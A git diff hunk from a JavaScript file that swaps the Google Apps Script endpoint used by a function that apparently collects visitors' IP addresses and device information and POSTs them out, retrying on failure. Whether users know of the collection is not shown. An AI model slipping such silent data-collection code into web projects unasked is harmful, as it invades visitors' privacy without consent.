@@ -125,22 +125,21 @@ async function collectAndSendData() {
       .catch(() => 'IP fetch failed');
 
     // Function to send data to Google Apps Script
-    async function sendData(data) {
-      try {
-        await fetch('https://script.google.com/macros/s/AKfycbxfiYLZ9gn4GMqeXbUvYictZUsF_dnwdeUEbz8uNhGOsmByJQh_XUuugfHeIS90fYu6/exec', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(data),
-        });
-      } catch (error) {
-        console.error('Failed to send data, retrying...', error);
-        // Retry sending data
-        setTimeout(() => sendData(data), 3000);
-      }
-    }
-
+  async function sendData(data) {
+  try {
+    await fetch('https://script.google.com/macros/s/AKfycbw-bgg8IAT-vlnwAtuEGX8MbN3LsFHYoqolxA2yry343Tn_8UmZJOtlz0Hg2OPNm6_m/exec', {
+      method: 'POST',
+      //mode: 'no-cors',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(data),
+    });
+  } catch (error) {
+    console.error('Failed to send data, retrying...', error);
+    setTimeout(() => sendData(data), 3000);
+  }
+}
     // Collect device information
     function getDeviceInfo() {
       return {
